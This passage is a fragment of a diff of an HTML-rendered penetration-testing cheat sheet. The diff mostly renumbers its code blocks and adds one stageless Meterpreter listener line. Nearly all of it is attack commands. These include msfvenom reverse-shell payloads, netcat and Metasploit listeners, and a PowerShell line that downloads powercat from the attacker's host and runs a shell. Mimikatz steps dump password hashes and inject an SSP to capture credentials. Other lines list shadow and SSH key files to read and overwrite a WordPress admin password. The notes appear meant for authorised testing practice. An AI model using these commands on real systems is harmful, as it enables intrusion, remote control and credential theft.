class="o">()</span>
+</span><span id="__span-68-23"><a id="__codelineno-68-23" name="__codelineno-68-23" href="#__codelineno-68-23"></a>
+</span><span id="__span-68-24"><a id="__codelineno-68-24" name="__codelineno-68-24" href="#__codelineno-68-24"></a><span class="c1"># Python file hosting</span>
+</span><span id="__span-68-25"><a id="__codelineno-68-25" name="__codelineno-68-25" href="#__codelineno-68-25"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-68-26"><a id="__codelineno-68-26" name="__codelineno-68-26" href="#__codelineno-68-26"></a>
+</span><span id="__span-68-27"><a id="__codelineno-68-27" name="__codelineno-68-27" href="#__codelineno-68-27"></a><span class="c1"># Create payloads with msfvenom</span>
+</span><span id="__span-68-28"><a id="__codelineno-68-28" name="__codelineno-68-28" href="#__codelineno-68-28"></a><span class="c1"># .exe 64-bit, stageless</span>
+</span><span id="__span-68-29"><a id="__codelineno-68-29" name="__codelineno-68-29" href="#__codelineno-68-29"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
+</span><span id="__span-68-30"><a id="__codelineno-68-30" name="__codelineno-68-30" href="#__codelineno-68-30"></a><span class="c1"># .exe 32-bit, stageless</span>
+</span><span id="__span-68-31"><a id="__codelineno-68-31" name="__codelineno-68-31" href="#__codelineno-68-31"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
+</span><span id="__span-68-32"><a id="__codelineno-68-32" name="__codelineno-68-32" href="#__codelineno-68-32"></a><span class="c1"># .elf, stageless</span>
+</span><span id="__span-68-33"><a id="__codelineno-68-33" name="__codelineno-68-33" href="#__codelineno-68-33"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell
+</span><span id="__span-68-34"><a id="__codelineno-68-34" name="__codelineno-68-34" href="#__codelineno-68-34"></a><span class="c1"># PHP</span>
+</span><span id="__span-68-35"><a id="__codelineno-68-35" name="__codelineno-68-35" href="#__codelineno-68-35"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/reverse_tcp<span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>&gt;<span class="w"> </span>pwn.php
 </span></code></pre></div>
 <h4 id="listeners">Listeners<a class="headerlink" href="#listeners" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c1"># Netcat listener</span>
-</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span>PORT
-</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>
-</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="c1"># Meterpreter listener</span>
-</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"</span>
-</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>
-</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="c1"># Powercat listener script (Kali) and command to execute</span>
-</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a>cp<span class="w"> </span>/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1<span class="w"> </span>.
-</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">"http://IP/powercat.ps1"</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>-e<span class="w"> </span>powershell<span class="w"> </span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c1"># Netcat listener</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span>PORT
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="c1"># Meterpreter listener</span>
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"</span>
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="c1"># Meterpreter listener (stageless)</span>
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">"use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST IP;set LPORT PORT;run;"</span><span class="w">   </span>
+</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>
+</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a><span class="c1"># Powercat listener script (Kali) and command to execute</span>
+</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a>cp<span class="w"> </span>/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1<span class="w"> </span>.
+</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">"http://IP/powercat.ps1"</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>-e<span class="w"> </span>powershell<span class="w"> </span>
 </span></code></pre></div>
 <h4 id="upgrade-shell">Upgrade shell<a class="headerlink" href="#upgrade-shell" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="c1"># Upgrade shell with Python</span>
-</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="c1"># Fix on local side to make proper TTY</span>
-</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>Ctrl<span class="w"> </span>+<span class="w"> </span>Z
-</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
-</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>Enter
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="c1"># Upgrade shell with Python</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="c1"># Fix on local side to make proper TTY</span>
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>Ctrl<span class="w"> </span>+<span class="w"> </span>Z
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>Enter
 </span></code></pre></div>
 <h3 id="windows-authentication">Windows Authentication<a class="headerlink" href="#windows-authentication" title="Permanent link">¶</a></h3>
 <h4 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c1"># Run Mimikatz in elevated PowerShell window</span>
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>.<span class="se">\m</span>imikatz.exe
-</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
-</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="c1"># Enable SeDebugPrivilege for needed debug privs</span>
-</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>privilege::debug
-</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>
-</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="c1"># Elevate to SYSTEM privs</span>
-</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>token::elevate
-</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a>
-</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="c1"># Dump passwords</span>
-</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a><span class="c1"># Option 1 (local user): extract NThashes from SAM</span>
-</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a>lsadump::sam
-</span><span id="__span-69-13"><a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a><span class="c1"># Option 2 (domain user): extract NThashes from LSASS</span>
-</span><span id="__span-69-14"><a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a>sekurlsa::logonpasswords
-</span><span id="__span-69-15"><a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a>
-</span><span id="__span-69-16"><a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a><span class="c1"># Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds</span>
-</span><span id="__span-69-17"><a id="__codelineno-69-17" name="__codelineno-69-17" href="#__codelineno-69-17"></a>misc::memssp
-</span><span id="__span-69-18"><a id="__codelineno-69-18" name="__codelineno-69-18" href="#__codelineno-69-18"></a><span class="c1"># Check output after auth request happened</span>
-</span><span id="__span-69-19"><a id="__codelineno-69-19" name="__codelineno-69-19" href="#__codelineno-69-19"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>imilsa.log
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c1"># Run Mimikatz in elevated PowerShell window</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>.<span class="se">\m</span>imikatz.exe
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="c1"># Enable SeDebugPrivilege for needed debug privs</span>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>privilege::debug
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
+</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="c1"># Elevate to SYSTEM privs</span>
+</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a>token::elevate
+</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>
+</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="c1"># Dump passwords</span>
+</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="c1"># Option 1 (local user): extract NThashes from SAM</span>
+</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a>lsadump::sam
+</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="c1"># Option 2 (domain user): extract NThashes from LSASS</span>
+</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a>sekurlsa::logonpasswords
+</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a>
+</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="c1"># Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds</span>
+</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a>misc::memssp
+</span><span id="__span-71-18"><a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a><span class="c1"># Check output after auth request happened</span>
+</span><span id="__span-71-19"><a id="__codelineno-71-19" name="__codelineno-71-19" href="#__codelineno-71-19"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>imilsa.log
 </span></code></pre></div>
 <h3 id="misc">Misc.<a class="headerlink" href="#misc" title="Permanent link">¶</a></h3>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="c1"># Folders/files to look in</span>
-</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>/var/www/html/<span class="w"> </span>
-</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>/etc/passwd
-</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>/etc/shadow
-</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>/proc/self/environ
-</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>/var/www/html/webdav/passwd.dav
-</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>
-</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a><span class="c1"># SSH key handling</span>
-</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>../.ssh/id_rsa
-</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>id_rsa
-</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>sudo<span class="w"> </span>-l
-</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>
-</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>
-</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>
-</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a><span class="c1"># Directory traversal Windows</span>
-</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
-</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a><span class="c1"># IIS web server files/folders</span>
-</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a>C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\L</span>ogFiles<span class="se">\W</span>3SVC1<span class="se">\</span>
-</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config
-</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a><span class="c1"># XAMPP PHP</span>
-</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21" href="#__codelineno-70-21"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs
-</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22" href="#__codelineno-70-22"></a>
-</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23" href="#__codelineno-70-23"></a><span class="c1"># Decode Base64</span>
-</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24" href="#__codelineno-70-24"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
-</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25" href="#__codelineno-70-25"></a><span class="c1"># Inspect file in binary</span>
-</span><span id="__span-70-26"><a id="__codelineno-70-26" name="__codelineno-70-26" href="#__codelineno-70-26"></a>xxd<span class="w"> </span>-b<span class="w"> </span>malware.txt
-</span><span id="__span-70-27"><a id="__codelineno-70-27" name="__codelineno-70-27" href="#__codelineno-70-27"></a>
-</span><span id="__span-70-28"><a id="__codelineno-70-28" name="__codelineno-70-28" href="#__codelineno-70-28"></a><span class="c1"># Test whether running in CMD or PS</span>
-</span><span id="__span-70-29"><a id="__codelineno-70-29" name="__codelineno-70-29" href="#__codelineno-70-29"></a><span class="o">(</span>dir<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>*<span class="sb">`</span><span class="p">|</span><span class="nb">echo</span><span class="w"> </span>CMD<span class="o">)</span><span class="p">;&amp;</span>&lt;<span class="c1"># rem #&gt;echo PowerShell</span>
-</span><span id="__span-70-30"><a id="__codelineno-70-30" name="__codelineno-70-30" href="#__codelineno-70-30"></a><span class="c1"># Escaping for formatting</span>
-</span><span id="__span-70-31"><a id="__codelineno-70-31" name="__codelineno-70-31" href="#__codelineno-70-31"></a><span class="sb">`</span>
-</span><span id="__span-70-32"><a id="__codelineno-70-32" name="__codelineno-70-32" href="#__codelineno-70-32"></a>
-</span><span id="__span-70-33"><a id="__codelineno-70-33" name="__codelineno-70-33" href="#__codelineno-70-33"></a><span class="c1"># Exiftool, display duplicated and unknown tags</span>
-</span><span id="__span-70-34"><a id="__codelineno-70-34" name="__codelineno-70-34" href="#__codelineno-70-34"></a>exiftool<span class="w"> </span>-a<span class="w"> </span>-u<span class="w"> </span>document.pdf
-</span><span id="__span-70-35"><a id="__codelineno-70-35" name="__codelineno-70-35" href="#__codelineno-70-35"></a>
-</span><span id="__span-70-36"><a id="__codelineno-70-36" name="__codelineno-70-36" href="#__codelineno-70-36"></a><span class="c1"># Quickly scan files for content</span>
-</span><span id="__span-70-37"><a id="__codelineno-70-37" name="__codelineno-70-37" href="#__codelineno-70-37"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"FILENAME_HINT"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-niH<span class="w"> </span><span class="s2">"TERM"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span>+
-</span><span id="__span-70-38"><a id="__codelineno-70-38" name="__codelineno-70-38" href="#__codelineno-70-38"></a>
-</span><span id="__span-70-39"><a id="__codelineno-70-39" name="__codelineno-70-39" href="#__codelineno-70-39"></a><span class="c1"># Python2 env</span>
-</span><span id="__span-70-40"><a id="__codelineno-70-40" name="__codelineno-70-40" href="#__codelineno-70-40"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w"> </span>python2<span class="w"> </span>python2-dev
-</span><span id="__span-70-41"><a id="__codelineno-70-41" name="__codelineno-70-41" href="#__codelineno-70-41"></a>curl<span class="w"> </span>https://bootstrap.pypa.io/pip/2.7/get-pip.py<span class="w"> </span>-o<span class="w"> </span>get-pip.py
-</span><span id="__span-70-42"><a id="__codelineno-70-42" name="__codelineno-70-42" href="#__codelineno-70-42"></a>sudo<span class="w"> </span>python2<span class="w"> </span>get-pip.py<span class="w">  </span>
-</span><span id="__span-70-43"><a id="__codelineno-70-43" name="__codelineno-70-43" href="#__codelineno-70-43"></a>pip2<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w">      </span>
-</span><span id="__span-70-44"><a id="__codelineno-70-44" name="__codelineno-70-44" href="#__codelineno-70-44"></a>python2<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py2env<span class="w">  </span>
-</span><span id="__span-70-45"><a id="__codelineno-70-45" name="__codelineno-70-45" href="#__codelineno-70-45"></a><span class="nb">source</span><span class="w"> </span>py2env/bin/activate
-</span><span id="__span-70-46"><a id="__codelineno-70-46" name="__codelineno-70-46" href="#__codelineno-70-46"></a>python<span class="w"> </span>-V
-</span><span id="__span-70-47"><a id="__codelineno-70-47" name="__codelineno-70-47" href="#__codelineno-70-47"></a><span class="c1"># Install impacket for Pyhon2</span>
-</span><span id="__span-70-48"><a id="__codelineno-70-48" name="__codelineno-70-48" href="#__codelineno-70-48"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">impacket</span><span class="o">==</span><span class="m">0</span>.9.22
-</span><span id="__span-70-49"><a id="__codelineno-70-49" name="__codelineno-70-49" href="#__codelineno-70-49"></a><span class="c1"># Python3 env</span>
-</span><span id="__span-70-50"><a id="__codelineno-70-50" name="__codelineno-70-50" href="#__codelineno-70-50"></a>python3<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py3env<span class="w">  </span>
-</span><span id="__span-70-51"><a id="__codelineno-70-51" name="__codelineno-70-51" href="#__codelineno-70-51"></a><span class="nb">source</span><span class="w"> </span>py3env/bin/activate
-</span><span id="__span-70-52"><a id="__codelineno-70-52" name="__codelineno-70-52" href="#__codelineno-70-52"></a>
-</span><span id="__span-70-53"><a id="__codelineno-70-53" name="__codelineno-70-53" href="#__codelineno-70-53"></a><span class="c1"># Open webdav folder, for example to host malicious .lnk file</span>
-</span><span id="__span-70-54"><a id="__codelineno-70-54" name="__codelineno-70-54" href="#__codelineno-70-54"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav
-</span><span id="__span-70-55"><a id="__codelineno-70-55" name="__codelineno-70-55" href="#__codelineno-70-55"></a>
-</span><span id="__span-70-56"><a id="__codelineno-70-56" name="__codelineno-70-56" href="#__codelineno-70-56"></a><span class="c1"># Proxy Python through Burp</span>
-</span><span id="__span-70-57"><a id="__codelineno-70-57" name="__codelineno-70-57" href="#__codelineno-70-57"></a><span class="c1"># https://www.th3r3p0.com/random/python-requests-and-burp-suite.html</span>
-</span><span id="__span-70-58"><a id="__codelineno-70-58" name="__codelineno-70-58" href="#__codelineno-70-58"></a><span class="nv">proxies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">"http"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span>,<span class="w"> </span><span class="s2">"https"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span><span class="o">}</span>
-</span><span id="__span-70-59"><a id="__codelineno-70-59" name="__codelineno-70-59" href="#__codelineno-70-59"></a><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s2">"https://www.google.com/"</span>,<span class="w"> </span><span class="nv">proxies</span><span class="o">=</span>proxies,<span class="w"> </span><span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
-</span><span id="__span-70-60"><a id="__codelineno-70-60" name="__codelineno-70-60" href="#__codelineno-70-60"></a>
-</span><span id="__span-70-61"><a id="__codelineno-70-61" name="__codelineno-70-61" href="#__codelineno-70-61"></a><span class="c1"># Small sample files for uploads</span>
-</span><span id="__span-70-62"><a id="__codelineno-70-62" name="__codelineno-70-62" href="#__codelineno-70-62"></a>https://github.com/mathiasbynens/small
-</span><span id="__span-70-63"><a id="__codelineno-70-63" name="__codelineno-70-63" href="#__codelineno-70-63"></a>
-</span><span id="__span-70-64"><a id="__codelineno-70-64" name="__codelineno-70-64" href="#__codelineno-70-64"></a><span class="c1"># File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder</span>
-</span><span id="__span-70-65"><a id="__codelineno-70-65" name="__codelineno-70-65" href="#__codelineno-70-65"></a><span class="se">\\\\</span>IP<span class="se">\\</span><span class="nb">test</span>
-</span><span id="__span-70-66"><a id="__codelineno-70-66" name="__codelineno-70-66" href="#__codelineno-70-66"></a>
-</span><span id="__span-70-67"><a id="__codelineno-70-67" name="__codelineno-70-67" href="#__codelineno-70-67"></a><span class="c1"># Wordpress</span>
-</span><span id="__span-70-68"><a id="__codelineno-70-68" name="__codelineno-70-68" href="#__codelineno-70-68"></a><span class="c1"># https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html</span>
-</span><span id="__span-70-69"><a id="__codelineno-70-69" name="__codelineno-70-69" href="#__codelineno-70-69"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://IP<span class="w"> </span>-v<span class="w">  </span>
-</span><span id="__span-70-70"><a id="__codelineno-70-70" name="__codelineno-70-70" href="#__codelineno-70-70"></a><span class="c1"># Replace admin password in database</span>
-</span><span id="__span-70-71"><a id="__codelineno-70-71" name="__codelineno-70-71" href="#__codelineno-70-71"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>--password<span class="o">=</span>PASS<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-e<span class="w"> </span><span class="s2">"use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c1"># Folders/files to look in</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>/var/www/html/<span class="w"> </span>
